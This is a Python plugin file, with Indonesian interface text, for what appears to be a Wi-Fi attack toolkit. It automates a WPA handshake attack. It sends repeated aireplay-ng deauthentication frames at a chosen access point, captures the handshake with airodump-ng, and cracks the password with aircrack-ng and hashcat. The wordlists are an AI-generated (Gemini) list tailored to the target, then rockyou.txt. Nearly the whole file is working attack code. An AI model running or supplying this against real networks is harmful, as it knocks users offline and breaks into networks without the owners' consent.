# File: attacks/handshake_attack.py
import os
import time
import subprocess
from common_utils import (
    run_command, generate_report, generate_gemini_wordlist, 
    convert_cap_to_hashcat, crack_with_aircrack, crack_with_hashcat,
    clear_session
)

class AttackPlugin:
    name = "Serangan WPA Handshake"
    description = "Klasik, butuh deauth"
    requires_aggressive_mode = False

    def __init__(self, ui, config):
        self.ui = ui
        self.config = config
        self.capture_file_prefix = self.config.get('Filenames', 'handshake_capture')
        self.hashcat_hash_file = self.config.get('Filenames', 'hashcat_hash')
        self.wordlist_dir = self.config.get('Paths', 'wordlist_dir')
        self.gemini_wordlist_file = self.config.get('Filenames', 'gemini_wordlist')

    def capture_handshake(self, monitor_interface, bssid, channel):
        self.ui.info(f"Menargetkan {bssid} di channel {channel}..."); test_out, _ = run_command(['aireplay-ng', '--test', monitor_interface], timeout=20)
        if not test_out: self.ui.error("Tes injeksi gagal."); return None
        self.ui.success("Tes injeksi berhasil. Memulai penangkapan handshake...")
        prefix = os.path.abspath(self.capture_file_prefix)
        for f in os.listdir('.'):
            if f.startswith(self.capture_file_prefix) or f.startswith(self.hashcat_hash_file): os.remove(f)
        cmd = ['airodump-ng', '-c', channel, '--bssid', bssid, '-w', prefix, monitor_interface]
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.ui.start_spinner("Mengirim deauth & menunggu handshake...")
            timeout = 60; start_time = time.time()
            while time.time() - start_time < timeout:
                subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); time.sleep(10)
                h_file = f"{prefix}-01.cap"
                if os.path.exists(h_file):
                    res, _ = run_command(['aircrack-ng', h_file])
                    if res and "1 handshake" in res: self.ui.stop_spinner(True, "WPA Handshake Berhasil Ditangkap!"); p.terminate(); return h_file
            self.ui.stop_spinner(False, "Waktu habis."); p.terminate(); return None
        except KeyboardInterrupt: self.ui.stop_spinner(False, "\nProses dibatalkan."); return None
        finally: subprocess.run(['pkill', '-f', 'airodump-ng'], check=False)

    def run(self, monitor_interface, target):
        self.ui.header(self.name); all_results = []
        handshake_file = self.capture_handshake(monitor_interface, target[1], target[2])
        if not handshake_file: return
        
        hashcat_file = convert_cap_to_hashcat(self.ui, self.config, handshake_file)
        gemini_wordlist_path = generate_gemini_wordlist(self.ui, self.config, target)
        
        if gemini_wordlist_path:
            result_tier1 = crack_with_aircrack(self.ui, self.config, target, handshake_file, gemini_wordlist_path)
            all_results.append(("Aircrack + Gemini Wordlist", result_tier1));
            if "KEY FOUND!" in result_tier1: 
                self.ui.success("Password ditemukan pada Tingkat 1!")
                generate_report(self.ui, self.config, target, all_results)
                clear_session(self.ui, self.config, target[1]); return
        
        if gemini_wordlist_path and os.path.exists(gemini_wordlist_path) and hashcat_file:
            choice = self.ui.prompt("Tingkat 1 gagal. Coba serangan canggih (Hashcat + Aturan)? (y/n): ").lower()
            if choice == 'y':
                result_tier2 = crack_with_hashcat(self.ui, self.config, target, hashcat_file, gemini_wordlist_path)
                all_results.append(("Hashcat + Gemini Wordlist + Aturan", result_tier2))
                if "KEY FOUND!" in result_tier2: 
                    self.ui.success("Password ditemukan pada Tingkat 2!")
                    generate_report(self.ui, self.config, target, all_results)
                    clear_session(self.ui, self.config, target[1]); return
        
        if gemini_wordlist_path and os.path.exists(gemini_wordlist_path): os.remove(gemini_wordlist_path)
        
        choice = self.ui.prompt("Tingkat sebelumnya gagal. Coba serangan terakhir (rockyou.txt)? (y/n): ").lower()
        if choice == 'y':
            standard_wordlist = os.path.join(self.config.get('Paths', 'wordlist_dir'), 'rockyou.txt')
            result_tier3 = crack_with_aircrack(self.ui, self.config, target, handshake_file, standard_wordlist)
            all_results.append(("Aircrack + rockyou.txt", result_tier3))
            if "KEY FOUND!" in result_tier3: clear_session(self.ui, self.config, target[1])
        
        generate_report(self.ui, self.config, target, all_results)